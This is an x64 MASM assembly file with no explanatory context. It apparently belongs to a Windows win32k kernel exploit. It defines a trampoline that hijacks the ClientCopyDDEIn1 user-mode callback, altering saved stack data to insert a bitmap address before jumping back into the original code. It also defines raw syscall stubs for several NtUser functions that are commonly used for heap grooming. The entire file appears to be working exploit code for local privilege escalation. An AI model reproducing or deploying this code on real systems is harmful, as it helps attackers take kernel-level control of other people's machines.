EXTERN  g_ClientCopyDDEIn1_ContinueAddr:DQ;
EXTERN  g_BitMapAddr:DQ;

.CODE  ;; ´úÂë¶Î

HijackTrampoFunc PROC
	push	r8
	lea		rax,[rsp+50h] 
	mov		r8,qword ptr g_BitMapAddr
	mov		qword ptr [rax+30h],r8 
	mov		r8,qword ptr [rax+20h] 
	mov		byte ptr [r8+2],2 
	pop		r8 
	pop		rax
	xor		r8d,r8d 
	mov		r11d,eax 
	lea		rcx,[rsp+20h]
	lea     edx,[r8+18h] 
	jmp		qword ptr g_ClientCopyDDEIn1_ContinueAddr
HijackTrampoFunc ENDP

NtUserCreateAcceleratorTable PROC
    mov     r10,rcx
    mov     eax,10F1h
    syscall
    ret
NtUserCreateAcceleratorTable ENDP

NtUserShowWindow PROC
    mov     r10,rcx
    mov     eax,1058h
    syscall
    ret
NtUserShowWindow ENDP

NtUserBeginPaint PROC
    mov     r10,rcx
    mov     eax,1017h
    syscall
    ret
NtUserBeginPaint ENDP

NtUserDestroyWindow PROC
    mov     r10,rcx
    mov     eax,109dh
    syscall
    ret
NtUserDestroyWindow ENDP

END